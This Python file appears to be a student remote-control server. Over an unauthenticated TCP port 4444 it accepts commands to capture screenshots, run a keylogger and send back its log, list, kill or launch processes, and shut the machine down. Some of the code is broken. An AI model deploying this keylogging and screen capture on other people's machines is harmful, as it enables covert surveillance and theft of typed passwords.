import socket
import threading
import pyautogui
import platform
import os
import subprocess
import sys
import psutil
from ipaddress import ip_address
from contextlib import closing
import tkinter as tk
from pynput import keyboard
from tkinter import *
from PIL import ImageGrab
import win32gui
import win32process

PORT = 4444 #Server Port is listening
img_bytes = b'\x00\x01\x02...'
# Replace with actual binary image data
EXIT = "exit"


class Server:
    def __init__(self, host):
        # Initialize the Server class with the given host (IP address or hostname)
        self.host = ''# host
        print(self.host + " " + str(PORT)) # Print the host and port information
        # Create a socket using AF_INET for IPv4 and SOCK_STREAM for TCP
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #SOCK_STREAM = TCP
        self.server.bind((self.host, PORT))
        self.server.listen(10)
        print("Server started listening on port " + str(PORT))
        self.clients = []
        self.ns = None # Network stream for reading from the client
        self.nr = None  # Network stream for reading binary data from the client
        self.nw = None  # Network stream for writing binary data to the client
        self.nr_lock = threading.Lock()  # Lock for thread-safe reading
        self.nw_lock = threading.Lock()  # Lock for thread-safe writing

    def start(self):
        try:
            print("SERVER: Waiting for Clients")
            while True:
                conn, addr = self.server.accept()  # Accept incoming client connection
                print("Connected by", conn.getpeername())  # Print client address
                self.clients.append(conn)  # Add client connection to the list
                threading.Thread(target=self.handle_client, args=((conn,))).start()
                # Create a new thread to handle the client and start it
                self.nr = conn.makefile("rb")  # Create a network stream for reading binary data
                self.nw = conn.makefile("wb")  # Create a network stream for writing binary data
        except socket.error as ex:
            print("Server error:", ex)
        finally:
            self.server.close()  # Close the server socket when done

    def stop(self):
        self.is_running = False  # Signal the server loop to stop
        for conn in self.clients:
            conn.close()# Close connections with all clients
        self.server.close()  # Close the server socket
        sys.exit(0)  # Exit the program
        
    def handle_client(self, conn):
        # self.clients.append(conn)  # Add client connection to the list
        try:
            while True:
                option = conn.recv(1024).decode("utf8")  # Receive client's command
                print("Client option: " + option)  # Print the received command
                if option == "TAKEPIC":
                    self.screenshot(conn)
                    continue# Call method to take a screenshot
                elif option == "SHUTDOWN":
                    self.shutdown()
                    continue# Call method to shut down the server
                elif option == "KEYLOG":
                    self.keylog(conn)
                    continue# Call method to handle keylogging
                elif option == "PROCESS":
                    self.process(conn) 
                    continue# Call method to handle process management
                elif option == "APPLICATION":
                    self.application(conn) 
                    continue# Call method to handle application management
                elif option == "QUIT":
                    self.stop()  # Call method to stop the server
                    break
                else:
                    conn.sendall(bytes("Option not found", "utf8"))  # Send an error response
                    break
        except socket.timeout as timeout:
            print("Timeout to client:", conn.getpeername())  # Handle timeout to client
        except socket.error as error:
            print("Disconnected to client:", conn.getpeername())  # Handle disconnection from client
        finally:
            # conn.close()  # Close the connection with the client
            self.clients.remove(conn)  # Remove client connection from the list


    def screenshot(self, conn):
        # Capture a screenshot using pyautogui
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(r'screenshot.png')
        filename = r'screenshot.png'
        while True:
            with open(filename, 'rb') as fs:
                print("Sending file.")
                while True:
                    data = fs.read(4096)
                    conn.send(data)
                    if not data:
                        break
                fs.close()
                print("Sent file.")
                break
        print("Done sending")
        
    def shutdown(self):
        # Thuong thi os.name cua Linux hoac Mac la "posix"
        system_name = platform.system()
        if system_name == "Windows":
            return os.system("shutdown /s /t 1")
        elif system_name == "Darwin" or system_name == "Linux":
            os.system("sudo shutdown -h now")
        else:
            print("Shutdown command not supported on this platform.")

    def receiveSignal(self, conn):
        try:
            with self.nr_lock:
                signal_data = conn.recv(1024).decode("utf-8")
                return signal_data
        except Exception as e:
            print("Error receiving signal:", str(e))
            return ""
        
    def start_keylog (self):
        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.start()            
    
    def on_key_press(self, key):
        shift = False
        caps = False
        try:
            with open("keylog.txt", "a") as log_file:
                if key == keyboard.Key.space:
                    log_file.write(' ')
                elif key == keyboard.Key.enter:
                    log_file.write('\n')
                elif key == keyboard.Key.backspace:
                    log_file.write('[Backspace]')
                elif key == keyboard.Key.tab:
                    log_file.write('[Tab]')
                elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                    shift = True
                elif key == keyboard.Key.caps_lock:
                    caps = not caps
                else:
                    k = str(key).replace("'", "")
                    if k.startswith('Key'):
                        log_file.write(f'[{k[4:]}]')
                    else:
                        if shift and caps:
                            log_file.write(k.lower())
                        elif shift or caps:
                            log_file.write(k.upper())
                        else:
                            log_file.write(k)
        except AttributeError:
            pass
    
    def write2logfile(self, key_str):
        with open("keylog.txt", "a") as log_file:
            log_file.write(key_str)
            
    def read_log_file (self):
        with open ("keylog.txt", "r") as log_file:
            return log_file.read()
        
    def stop_keylog (self):
        self.listener.stop()
        pass
    
    def clear_keylog(self):
        with open("keylog.txt", "w") as log_file:
            log_file.write("")

    def keylog(self, conn):
        # self.tklog = threading.Thread(target=Keylog.startKLog)
        # self.tklog.start()
        while True:
            s = self.receiveSignal(conn)
            print(s)
            if s == "PRINT":
                data = self.read_log_file()
                print(data)
                conn.send(data.encode())
            elif s == "HOOK":
                self.start_keylog()
            elif s == "UNHOOK":
                self.stop_keylog()
            elif s == "CLEAR":
                self.clear_keylog()
            elif s == "QUIT":
                conn.close()
                return

    def run_app(self, app_name):
        try:
            full_name = f"{app_name}.exe"
            subprocess.Popen(full_name)
            return f"{full_name} started successfully"
        except Exception as e:
            return f"Error starting {full_name}: {e}"

    def kill_app(self, pid):
        try:        
            subprocess.call(["taskkill","/F","/PID",str(pid)])
            return f"{pid} killed successfully"
        except Exception as e:
            return f"Error killing {pid}: {e}"

    def view_processes(self):
        try:
            processes = psutil.process_iter(attrs=['pid', 'name', 'num_threads'])
            process_list = []
            for process in processes:
                pid = process.info['pid']
                name = process.info['name']
                num_threads = process.info['num_threads']
                process_list.append(f"{name}\t{pid}\t{num_threads}")
            return '\n'.join(process_list)
        except Exception as e:
            return f"Error viewing apps: {e}"

    def view_apps(self):
        try:
            app_list = psutil.process_iter(attrs=['pid', 'name', 'num_threads'])
            app_list = []
            seen_pids = set()

            def enum_windows_callback(hwnd, _):
                if win32gui.IsWindowVisible(hwnd):
                    _, pid = win32process.GetWindowThreadProcessId(hwnd)
                    if pid in seen_pids:  # Check if PID has already been processed
                        return

                    seen_pids.add(pid)  # Add the PID to the set of seen PIDs

                    try:
                        p = psutil.Process(pid)
                        app_list.append(f"{p.name()}\t{pid}\t{p.num_threads()}")
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass

            win32gui.EnumWindows(enum_windows_callback, None)

            return '\n'.join(app_list)
        except Exception as e:
            return f"Error viewing apps: {e}"

    def handle_request(self, request, conn):
        request = request.strip().split()
        command = request[0]
        if command == "run":
            app_name = request[1]
            return self.run_app(app_name)
        elif command == "kill":
            app_name = request[1]
            print(app_name)
            return self.kill_app(app_name)
        elif command == "view":
            return self.view_apps()
        else:
            return "Invalid command"
    
    def application(self, conn):
        while True:
            ss = self.receiveSignal(conn)
            print(ss)
            s1 = ss.split()
            cm = s1[0] 
            if len(s1) > 1:
                data = s1[1]
            if cm == "XEM" or cm == "view":
                response = self.view_apps()
                conn.send(response.encode())
            elif cm == "KILL" or cm == "kill":
                print(data)
                response = self.kill_app(data)
                conn.send(response.encode())
            elif cm == "START" or cm == "start":
                response = self.run_app(data)
                conn.send(response.encode())
            elif cm == "QUIT":
                conn.close()
                return

    def process(self, conn):
        while True:
        # while True:
            ss = self.receiveSignal(conn)
            print(ss)
            s1 = ss.split()
            cm = s1[0] 
            if len(s1) > 1:
                data = s1[1]
            if cm == "XEM" or cm == "view":
                response = self.view_processes()
                conn.send(response.encode())
            elif cm == "KILL" or cm == "kill":
                print(data)
                response = self.kill_app(data)
                conn.send(response.encode())
            elif cm == "START" or cm == "start":
                response = self.run_app(data)
                conn.send(response.encode())
            elif cm == "QUIT":
                conn.close()
                return

    def button1_Click(self):
        ip = '' #'192.168.1.3'
        port = PORT
        with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as server:
            server.bind((ip, port))
            server.listen(100)

            client, _ = server.accept()
            ns = client.makefile('rwb')
            with self.nw_lock, self.nr_lock:
                self.nr = ns
                self.nw = ns

            while True:
                s = self.receiveSignal(client)
                print(s)
                if s == "KEYLOG":
                    self.keylog()
                elif s == "SHUTDOWN":
                    self.shutdown()
                elif s == "REGISTRY":
                    self.registry()
                elif s == "TAKEPIC":
                    self.screenshot()
                elif s == "PROCESS":
                    self.process()
                elif s == "APPLICATION":
                    self.application()
                elif s == "QUIT":
                    break

        client.shutdown(socket.SHUT_RDWR)
        client.close()

class ServerGUI(tk.Frame):
    def __init__(self, master=None, server=None):
        super().__init__(master)
        self.master = master
        self.server = server  # Store the server instance
        self.init_ui()

    def init_ui(self):
        self.master.title("Server")
        self.master.geometry("200x100")

        self.button1 = tk.Button(self, text="Open server", command=self.open_server)
        self.button1.pack(pady=20)

        self.pack()

    def open_server(self):
        self.process_click()

    def process_click(self):
        print("PROCESS command sent to the server.")
        
    def on_closing(self):
        if self.server:
            self.server.stop()
        self.master.destroy()

    def shutdown_server(self):
        print("Shutting down the server...")
        self.server.stop()  # Call the server's stop method

def main():
    # Create a Server instance and start the server thread
    server = Server('0.0.0.0')
    server_thread = threading.Thread(target=server.start)
    server_thread.start()
    
    # Create a GUI window using Tkinter
    root = tk.Tk()
    server_app = ServerGUI(master=root)
    root.protocol("WM_DELETE_WINDOW", server_app.on_closing)  # Handle window closing event
    server_app.mainloop()
    
    server.stop()  # Stop the server
    server_thread.join()  # Wait for the server thread to finish before exiting
    
if __name__ == "__main__":
    main()


